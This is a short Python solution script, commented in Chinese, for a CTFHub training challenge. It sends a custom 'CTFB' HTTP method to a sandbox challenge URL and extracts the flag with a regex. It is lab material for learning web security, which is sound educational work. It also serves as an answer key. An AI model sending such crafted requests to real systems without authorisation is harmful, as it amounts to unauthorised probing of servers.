# -*- coding: utf-8 -*-
"""CTFHub HTTP Method 题：用 CTFB 方法拿 flag
运行：python ctf_method.py
"""
import requests
import re

URL = "http://challenge-90c29f8090155cad.sandbox.ctfhub.com:10800/index.php"

print('=== 1. GET 正常访问（对照）===')
r = requests.get(URL, timeout=10)
print(r.text[:200])
print()

print('=== 2. CTFB 方法 ===')
r = requests.request('CTFB', URL, timeout=10)
print(r.text)
print()

# 找 flag
flags = re.findall(r'ctfhub\{[^}]+\}|flag\{[^}]+\}|FLAG\{[^}]+\}', r.text, re.I)
if flags:
    print(f'🏁 FLAG: {flags[0]}')
else:
    print('(未找到 flag——如果是环境实例问题，重置 CTFHub 环境再跑)')
